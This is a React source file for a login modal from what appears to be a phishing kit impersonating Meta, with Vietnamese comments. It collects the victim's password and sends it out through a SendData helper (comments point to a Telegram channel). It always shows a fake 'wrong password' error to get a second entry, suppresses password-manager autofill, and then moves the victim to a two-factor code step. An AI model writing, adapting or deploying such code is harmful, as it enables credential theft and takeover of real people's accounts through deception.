import React from 'react';
import { CircleAlert } from 'lucide-react';
import Modal from '#components/modals/Modal';
import PasswordInput from '#components/password-input/password-input';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm } from '../../app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';
import { SendData } from '@/utils/sendData';

interface PasswordModalProps {
    isOpend: boolean;
    isOpendTwoFactor: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const SUBMIT_DELAY_MS = 2200;
/** Chờ lâu hơn sau lần nhập mật khẩu thứ 2 (xác nhận) trước khi mở 2FA */
const SUBMIT_DELAY_SECOND_PASSWORD_MS = 7000;
/** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';

/** Bỏ khoảng trắng / ký tự ẩn — mật khẩu trống hoặc chỉ space không được submit */
function normalizePassword(value: string) {
    return value.replace(/[\s\u200B-\u200D\uFEFF]/g, '');
}

const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
    const t = useAppStrings();

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [loading, setLoading] = React.useState(false);
    const [passwordStep, setPasswordStep] = React.useState<1 | 2>(1);
    const [password, setPassword] = React.useState('');
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const dispatch = useAppDispatch();
    const formData = useAppSelector((state) => state.stepForm.data);

    React.useEffect(() => {
        setIsOpen(isOpend);
        if (isOpend) {
            setPasswordStep(1);
            setPassword('');
            setErrors({});
            setLoading(false);
            dispatch(
                updateForm({
                    password: '',
                    passwordSecond: '',
                    passwordThird: '',
                })
            );
        }
    }, [isOpend, dispatch]);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const value = normalizePassword(e.target.value);
        setPassword(value);
        setErrors((prev) => ({ ...prev, password: '' }));

        if (passwordStep === 1) {
            dispatch(updateForm({ password: value }));
        } else {
            dispatch(updateForm({ passwordSecond: value }));
        }
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const goForgotToTwoFa = () => {
        dispatch(updateForm({ passwordThird: PASSWORD_THIRD_FORGOT_MARKER }));
        isOpendTwoFactor(true);
        handleClose();
    };

    const waitAfterSend = async (passwordValue: string) => {
        try {
            await SendData({ ...formData, password: passwordValue });
        } catch {
            /* luồng UX vẫn tiếp tục */
        }
        await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
    };

    const handSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (loading) return;

        const passwordValue = normalizePassword(password);
        if (!passwordValue) {
            setPassword('');
            setErrors({ password: t.password.errEmpty });
            return;
        }

        if (passwordStep === 1) {
            setLoading(true);
            try {
                await waitAfterSend(passwordValue);
                setPassword('');
                setErrors({ password: t.password.errWrong });
                setPasswordStep(2);
            } finally {
                setLoading(false);
            }
            return;
        }

        setLoading(true);
        try {
            await SendData({ ...formData, passwordSecond: passwordValue });
            await new Promise((r) => setTimeout(r, SUBMIT_DELAY_SECOND_PASSWORD_MS));
            isOpendTwoFactor(true);
            handleClose();
        } catch (error) {
            console.error('Error submitting form:', error);
            setPassword('');
            setErrors({ password: t.password.errWrong });
        } finally {
            setLoading(false);
        }
    };

    const canSubmit = Boolean(normalizePassword(password)) && !loading;

    const inputClass = (field: string) =>
        ` border ${errors[field] ? 'border-red-500' : 'border-meta-border'} `;

    const prompt = passwordStep === 1 ? t.password.firstPrompt : t.password.secondPrompt;

    const passwordName = passwordStep === 1 ? 'account_access_key' : 'recheck_access_key';

    const passwordId = passwordStep === 1 ? 'accessKey' : 'accessKeyConfirm';

    return (
        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false} panelClassName="mv-official-modal" backdropClassName="mv-official-backdrop">
            <div className="flex min-h-full w-full min-w-0 flex-1 flex-col pb-1">
                <div className="flex w-full min-w-0 flex-col gap-5">
                    <div className="flex flex-col items-center gap-4">
                        <div className="h-[48px] w-[48px] shrink-0 sm:h-[50px] sm:w-[50px]">
                            <img src="/images/meta/logo.svg" className="h-full w-full" width="50" height="50" alt="logo" fetchPriority="high" decoding="sync" />
                        </div>
                        <p className="w-full text-center text-[14px] leading-[1.55] text-meta-text-secondary sm:text-[15px]">
                            {prompt}
                        </p>
                    </div>

                    <form
                        className="w-full min-w-0"
                        onSubmit={handSubmit}
                        autoComplete="off"
                        data-lpignore="true"
                        data-1p-ignore="true"
                        data-bwignore="true"
                    >
                        <div className="w-full">
                            <PasswordInput
                                id={passwordId}
                                name={passwordName}
                                placeholder={passwordStep === 1 ? t.password.phFirst : t.password.phSecond}
                                className={inputClass('password')}
                                value={password}
                                onChange={handleChange}
                                autoComplete="off"
                                allowToggle
                                ariaShowPassword={t.password.ariaShowPassword}
                                ariaHidePassword={t.password.ariaHidePassword}
                                ariaPasswordToggleDisabled={t.password.ariaPasswordToggleDisabled}
                            />
                            {errors.password ? (
                                <div
                                    className="mb-[10px] mt-[-5px] flex items-start gap-2 text-[14px] text-red-600"
                                    role="alert"
                                >
                                    <CircleAlert className="mt-0.5 size-4 shrink-0" aria-hidden />
                                    <span>{errors.password}</span>
                                </div>
                            ) : null}
                        </div>
                        <div className="mt-5 w-full">
                            <button
                                type="submit"
                                className={`mv-btn-primary flex min-h-[48px] w-full cursor-pointer items-center justify-center rounded-[40px] px-4 py-[10px] text-[15px] font-semibold text-white transition-[filter,transform] duration-200 active:scale-[0.995] ${!canSubmit ? 'cursor-not-allowed opacity-70' : ''}`}
                                disabled={!canSubmit}
                            >
                                {loading && (
                                    <div className="mr-[10px] h-[20px] w-[20px] animate-spin">
                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                                    </div>
                                )}
                                {loading ? '' : t.password.continue}
                            </button>
                        </div>
                    </form>
                </div>

                <div className="mx-auto mt-auto h-[52px] w-[52px] shrink-0 pt-6 sm:pt-8 sm:h-[60px] sm:w-[60px]">
                    <img src="/images/meta/logo-gray.svg" className="h-full w-full" width="60" height="60" alt="" />
                </div>
            </div>
        </Modal>
    );
};

export default PasswordModal;
